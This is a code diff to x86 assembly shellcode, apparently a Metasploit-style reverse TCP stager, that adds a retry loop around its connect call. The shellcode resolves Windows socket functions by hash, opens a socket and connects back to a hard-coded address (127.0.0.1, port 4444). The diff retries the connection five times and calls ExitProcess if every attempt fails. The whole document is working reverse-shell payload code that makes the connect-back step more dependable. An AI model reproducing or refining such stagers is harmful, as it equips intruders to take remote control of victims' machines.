@@ -34,12 +34,29 @@ reverse_tcp:
   push 0xE0DF0FEA        ; hash( "ws2_32.dll", "WSASocketA" )
   call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
   xchg edi, eax          ; save the socket for later, don't care about the value of eax after this
-  
+
+set_address:
+  push byte 0x05         ; retry counter
   push 0x0100007F        ; host 127.0.0.1
   push 0x5C110002        ; family AF_INET and port 4444
   mov esi, esp           ; save pointer to sockaddr struct
+  
+try_connect:
   push byte 16           ; length of the sockaddr struct
   push esi               ; pointer to the sockaddr struct
   push edi               ; the socket
   push 0x6174A599        ; hash( "ws2_32.dll", "connect" )
   call ebp               ; connect( s, &sockaddr, 16 );
+
+  test eax,eax           ; non-zero means a failure
+  jz short connected
+
+handle_failure:
+  dec dword [esi+8]
+  jnz short try_connect
+
+failure:
+  push 0x56A2B5F0        ; hardcoded to exitprocess for size
+  call ebp
+
+connected:
